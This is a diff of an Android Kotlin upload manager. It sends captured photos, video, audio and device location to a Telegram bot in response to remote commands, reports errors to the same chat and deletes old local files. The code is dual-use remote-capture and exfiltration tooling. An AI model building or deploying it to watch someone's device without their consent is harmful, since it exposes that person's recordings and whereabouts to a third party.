@@ -8,8 +8,12 @@ import android.util.Log
 import androidx.room.*
 import kotlinx.coroutines.*
 import okhttp3.*
+import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import java.io.File
 import java.io.IOException
+import java.text.SimpleDateFormat
+import java.util.*
 
 @Entity(tableName = "pending_uploads")
 data class PendingUpload(
@@ -17,12 +21,12 @@ data class PendingUpload(
     val filePath: String,
     val chatId: String,
     val type: String, // "photo", "video", "audio", "location", "text"
-    val timestamp: Long = System.currentTimeMillis()
+    val actionTimestamp: Long = System.currentTimeMillis() // When the action (record/capture) occurred
 )
 
 @Dao
 interface PendingUploadDao {
-    @Query("SELECT * FROM pending_uploads ORDER BY timestamp ASC")
+    @Query("SELECT * FROM pending_uploads ORDER BY actionTimestamp ASC")
     suspend fun getAll(): List<PendingUpload>
 
     @Insert(onConflict = OnConflictStrategy.REPLACE)
@@ -39,7 +43,6 @@ abstract class UploadDatabase : RoomDatabase() {
     companion object {
         @Volatile
         private var INSTANCE: UploadDatabase? = null
-
         fun getInstance(context: Context): UploadDatabase {
             return INSTANCE ?: synchronized(this) {
                 INSTANCE ?: Room.databaseBuilder(
@@ -58,9 +61,16 @@ object UploadManager {
     private lateinit var dao: PendingUploadDao
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
+    // File retention: delete files after upload, and files older than this many days (default 3)
+    private const val FILE_RETENTION_DAYS = 3
+
     private fun getBotToken(): String {
         val token = Preferences.getBotToken(appContext)
         return token ?: ""
+    }
+
+    private fun getDeviceNickname(): String {
+        return Preferences.getNickname(appContext) ?: "Device"
     }
 
     fun init(context: Context) {
@@ -73,38 +83,53 @@ object UploadManager {
         initialized = true
     }
 
-    fun queueUpload(file: File, chatId: String, type: String) {
+    /**
+     * Queue a file for upload. actionTimestamp is when the file was actually recorded/captured.
+     */
+    fun queueUpload(file: File, chatId: String, type: String, actionTimestamp: Long = System.currentTimeMillis()) {
         scope.launch {
             val upload = PendingUpload(
                 filePath = file.absolutePath,
                 chatId = chatId,
-                type = type
+                type = type,
+                actionTimestamp = actionTimestamp
             )
             dao.insert(upload)
             showNotification("Queued: $type", "Preparing to upload ${file.name}")
+            sendTelegramMessage(chatId, "[${
+                getDeviceNickname()
+            }] Command received: $type. Processing...")
             uploadAllPending()
         }
     }
 
-    private suspend fun uploadAllPending() {
+    suspend fun uploadAllPending() {
+        performRetentionCleanup()
         val uploads = dao.getAll()
         for (upload in uploads) {
             val file = File(upload.filePath)
             if (!file.exists() || file.length() == 0L) {
                 dao.delete(upload)
                 showNotification("Skipped: ${upload.type}", "File missing: ${file.name}")
+                sendTelegramMessage(upload.chatId, "[${
+                    getDeviceNickname()
+                }] Error: File missing for ${upload.type} at ${formatDateTime(upload.actionTimestamp)}")
                 continue
             }
             showNotification("Uploading: ${upload.type}", "Uploading ${file.name}")
-            val success = try {
-                if (upload.type == "location") {
-                    sendLocationMessageToTelegram(file, upload.chatId)
-                } else {
-                    uploadFileToTelegram(file, upload.chatId, upload.type)
+            val success: Boolean = try {
+                when (upload.type) {
+                    "location" -> sendLocationToTelegram(file, upload.chatId, upload.actionTimestamp)
+                    "photo", "video", "audio" -> uploadFileToTelegram(file, upload.chatId, upload.type, upload.actionTimestamp)
+                    "text" -> uploadFileToTelegram(file, upload.chatId, "text", upload.actionTimestamp)
+                    else -> uploadFileToTelegram(file, upload.chatId, "document", upload.actionTimestamp)
                 }
             } catch (e: Exception) {
                 Log.e("UploadManager", "Upload error: ${e.localizedMessage}")
                 showNotification("Upload Error", "Error uploading ${file.name}: ${e.localizedMessage}")
+                sendTelegramMessage(upload.chatId, "[${
+                    getDeviceNickname()
+                }] Error uploading ${upload.type}: ${e.localizedMessage} at ${formatDateTime(upload.actionTimestamp)}")
                 false
             }
             if (success) {
@@ -118,79 +143,59 @@ object UploadManager {
     }
 
     /**
-     * Sends a location as a message to the Telegram bot.
-     * The file should contain a Google Maps URL in plain text (as produced by LocationService).
-     * If the file is not a valid maps URL, sends the raw text.
+     * Sends a location as a Telegram message (map link & date/time). If file is invalid, sends a user-friendly error.
      */
-    private fun sendLocationMessageToTelegram(file: File, chatId: String): Boolean {
+    fun sendLocationToTelegram(file: File, chatId: String, actionTimestamp: Long): Boolean {
         val botToken = getBotToken()
         if (botToken.isBlank()) {
-            Log.e("UploadManager", "Bot token is missing!")
+            sendTelegramMessage(chatId, "[${
+                getDeviceNickname()
+            }] Error: Bot token is missing! Cannot send location.")
             return false
         }
 
         val text = try {
             file.readText().trim()
         } catch (e: Exception) {
-            Log.e("UploadManager", "Failed to read location file: ${e.localizedMessage}")
+            sendTelegramMessage(chatId, "[${
+                getDeviceNickname()
+            }] Error: Could not read location file.")
             return false
         }
 
-        // Special handling: If the text matches a Google Maps URL, try to extract lat/lng and send as real location
-        val mapsRegex = Regex("""https?://maps\.google\.com/\?q=([-0-9.]+),([-0-9.]+)""")
-        val match = mapsRegex.find(text)
-        val url: String
-        val method: String
-        val body: RequestBody
-
-        if (match != null && match.groupValues.size == 3) {
-            // Send as real location using sendLocation
+        // Try to parse as JSON {lat, lng, timestamp} (from RemoteServices)
+        val locationRegex = Regex("""\{"lat":([-\d.]+),"lng":([-\d.]+),.*\}""")
+        val match = locationRegex.find(text)
+        return if (match != null && match.groupValues.size >= 3) {
             val lat = match.groupValues[1]
             val lng = match.groupValues[2]
-            url = "https://api.telegram.org/bot$botToken/sendLocation"
-            method = "sendLocation"
-            body = FormBody.Builder()
-                .add("chat_id", chatId)
-                .add("latitude", lat)
-                .add("longitude", lng)
-                .build()
+            val link = "https://maps.google.com/?q=$lat,$lng"
+            val dt = formatDateTime(actionTimestamp)
+            // 1. Send link
+            sendTelegramMessage(chatId, "[${
+                getDeviceNickname()
+            }] 📍 Location: $link")
+            // 2. Send time
+            sendTelegramMessage(chatId, "Time: $dt")
+            true
         } else {
-            // Send as plain text message
-            url = "https://api.telegram.org/bot$botToken/sendMessage"
-            method = "sendMessage"
-            body = FormBody.Builder()
-                .add("chat_id", chatId)
-                .add("text", text)
-                .build()
-        }
-
-        val client = OkHttpClient()
-        val request = Request.Builder().url(url).post(body).build()
-
-        try {
-            client.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.e("UploadManager", "Telegram $method failed: ${response.code} ${response.body?.string()}")
-                    return false
-                }
-                Log.d("UploadManager", "Telegram $method succeeded for location: $text")
-                return true
-            }
-        } catch (e: IOException) {
-            Log.e("UploadManager", "Telegram $method exception: ${e.localizedMessage}")
-            return false
+            // Could not parse location, send as plain text
+            sendTelegramMessage(chatId, "[${
+                getDeviceNickname()
+            }] Location unavailable or malformed. Data received: $text\nTime: ${formatDateTime(actionTimestamp)}")
+            false
         }
     }
 
     /**
-     * Uploads a file to the Telegram bot using the Telegram Bot API.
-     * Supports: photo, video, audio, document (for text/errors).
-     * Returns true if upload succeeded, false otherwise.
+     * Uploads a file to the Telegram bot with a date/time message. If fails, sends an error message to Telegram.
      */
-    private fun uploadFileToTelegram(file: File, chatId: String, type: String): Boolean {
+    fun uploadFileToTelegram(file: File, chatId: String, type: String, actionTimestamp: Long): Boolean {
         val botToken = getBotToken()
         if (botToken.isBlank()) {
-            Log.e("UploadManager", "Bot token is missing!")
+            sendTelegramMessage(chatId, "[${
+                getDeviceNickname()
+            }] Error: Bot token is missing! Cannot send $type.")
             return false
         }
 
@@ -198,11 +203,8 @@ object UploadManager {
             "photo" -> "https://api.telegram.org/bot$botToken/sendPhoto"
             "video" -> "https://api.telegram.org/bot$botToken/sendVideo"
             "audio" -> "https://api.telegram.org/bot$botToken/sendAudio"
-            "text" -> "https://api.telegram.org/bot$botToken/sendDocument"
             else -> "https://api.telegram.org/bot$botToken/sendDocument"
         }
-
-        val client = OkHttpClient()
 
         val fileField = when (type) {
             "photo" -> "photo"
@@ -218,33 +220,61 @@ object UploadManager {
             else -> "application/octet-stream"
         }
 
+        val client = OkHttpClient()
         val requestBodyBuilder = MultipartBody.Builder().setType(MultipartBody.FORM)
             .addFormDataPart("chat_id", chatId)
-
-        requestBodyBuilder.addFormDataPart(
-            fileField,
-            file.name,
-            file.asRequestBody(mediaType.toMediaTypeOrNull())
-        )
+            .addFormDataPart(fileField, file.name, file.asRequestBody(mediaType.toMediaTypeOrNull()))
 
         val requestBody = requestBodyBuilder.build()
-        val request = Request.Builder()
-            .url(url)
-            .post(requestBody)
-            .build()
+        val request = Request.Builder().url(url).post(requestBody).build()
 
         try {
             client.newCall(request).execute().use { response ->
                 if (!response.isSuccessful) {
-                    Log.e("UploadManager", "Telegram upload failed: ${response.code} ${response.body?.string()}")
+                    sendTelegramMessage(chatId, "[${
+                        getDeviceNickname()
+                    }] Error uploading $type: ${response.code} ${response.body?.string()} at ${formatDateTime(actionTimestamp)}")
                     return false
                 }
-                Log.d("UploadManager", "Telegram upload succeeded: ${file.name}")
+                // After file upload, send the time and device info
+                sendTelegramMessage(chatId, "[${
+                    getDeviceNickname()
+                }] ${type.replaceFirstChar { it.uppercase() }} captured at ${formatDateTime(actionTimestamp)}")
                 return true
             }
         } catch (e: IOException) {
-            Log.e("UploadManager", "Telegram upload exception: ${e.localizedMessage}")
+            sendTelegramMessage(chatId, "[${
+                getDeviceNickname()
+            }] Error uploading $type: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}")
             return false
+        }
+    }
+
+    /** Now public so it can be used in ActionHandlers/RemoteServices */
+    fun sendTelegramMessage(chatId: String, message: String) {
+        val botToken = getBotToken()
+        if (botToken.isBlank()) return
+        val url = "https://api.telegram.org/bot$botToken/sendMessage"
+        val client = OkHttpClient()
+        val body = FormBody.Builder()
+            .add("chat_id", chatId)
+            .add("text", message)
+            .build()
+        val request = Request.Builder().url(url).post(body).build()
+        try {
+            client.newCall(request).execute().close()
+        } catch (_: Exception) {}
+    }
+
+    /** Delete old files after X days to save space */
+    private fun performRetentionCleanup() {
+        val retentionMillis = FILE_RETENTION_DAYS * 24 * 60 * 60 * 1000L
+        val now = System.currentTimeMillis()
+        val files = appContext.getExternalFilesDir(null)?.listFiles() ?: return
+        for (file in files) {
+            if (now - file.lastModified() > retentionMillis) {
+                file.delete()
+            }
         }
     }
 
